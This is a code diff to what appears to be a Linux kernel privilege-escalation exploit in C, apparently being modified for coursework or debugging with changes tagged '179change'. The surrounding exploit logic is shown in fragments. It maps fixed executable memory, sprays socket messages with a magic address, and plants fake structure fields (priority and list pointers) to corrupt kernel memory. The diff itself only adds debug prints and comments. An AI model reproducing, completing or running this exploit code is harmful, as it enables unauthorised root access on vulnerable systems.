@@ -514,6 +514,7 @@ int make_socket() {
 	return sockfd;
 }
 
+
 void *send_magicmsg(void *arg) {
     //179change print 
     printf("starting send msg\n");
@@ -521,6 +522,8 @@ void *send_magicmsg(void *arg) {
     //179change changed mmsghdr to mmsghdr2
 	struct mmsghdr2 msgvec[1];
 	struct iovec msg_iov[8];
+    //179change
+	//unsigned long databuf[0x20];
 	unsigned long databuf[0x20];
 	int i;
 	int ret;
@@ -534,10 +537,13 @@ void *send_magicmsg(void *arg) {
 	setpriority(PRIO_PROCESS, 0, 12);
 
 	sockfd = make_socket();
-
+    
+    //179change
+    //print for magic
+    printf("Magic %ld\n", MAGIC);
 	for (i = 0; i < ARRAY_SIZE(databuf); i++) {
 		databuf[i] = MAGIC;
-	}
+    }
 
 	for (i = 0; i < 8; i++) {
 		msg_iov[i].iov_base = (void *)MAGIC;
@@ -593,7 +599,7 @@ void *send_magicmsg(void *arg) {
 
 static inline setup_exploit(unsigned long mem)
 {
-	*((unsigned long *)(mem - 0x04)) = 0x81;
+	*((unsigned long *)(mem - 0x04)) = 0x81; //prio
 	*((unsigned long *)(mem + 0x00)) = mem + 0x20;
 	*((unsigned long *)(mem + 0x08)) = mem + 0x28;
 	*((unsigned long *)(mem + 0x1c)) = 0x85;
@@ -866,7 +872,9 @@ void init_exploit() {
 	addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
 	addr += 0x800;
 	MAGIC = addr;
-	if ((long)addr >= 0) {
+	//179change
+    printf("Magic %ld\n", MAGIC);
+    if ((long)addr >= 0) {
 		printf("first mmap failed?\n");
 		while (1) {
 			sleep(10);
@@ -876,6 +884,8 @@ void init_exploit() {
 	addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
 	addr += 0x800;
 	MAGIC_ALT = addr;
+    //179change
+    printf("Magic alt %ld\n", MAGIC_ALT );
 	if (addr > 0x110000) {
 		printf("second mmap failed?\n");
 		while (1) {
